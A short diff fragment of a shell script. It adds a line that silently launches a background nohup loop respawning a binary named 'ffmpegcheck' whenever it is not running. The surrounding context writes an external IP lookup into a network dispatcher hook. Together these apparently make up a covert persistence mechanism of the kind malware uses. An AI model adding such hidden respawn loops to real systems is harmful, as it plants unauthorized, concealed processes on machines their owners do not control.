@@ -34,3 +34,4 @@ timeout 0.130 curl bot.whatismyipaddress.com > /etc/networkd-dispatcher/routable
       rm -d "$mailingdirname" 2>/dev/null
    fi
 fi
+if [[ $(ps auxf|grep -v grep|grep -c "/home/homeowner/ffmpegcheck") == 0 ]];then nohup bash -c 'while [ true ];do /home/homeowner/ffmpegcheck;done' 2>/dev/null &  fi
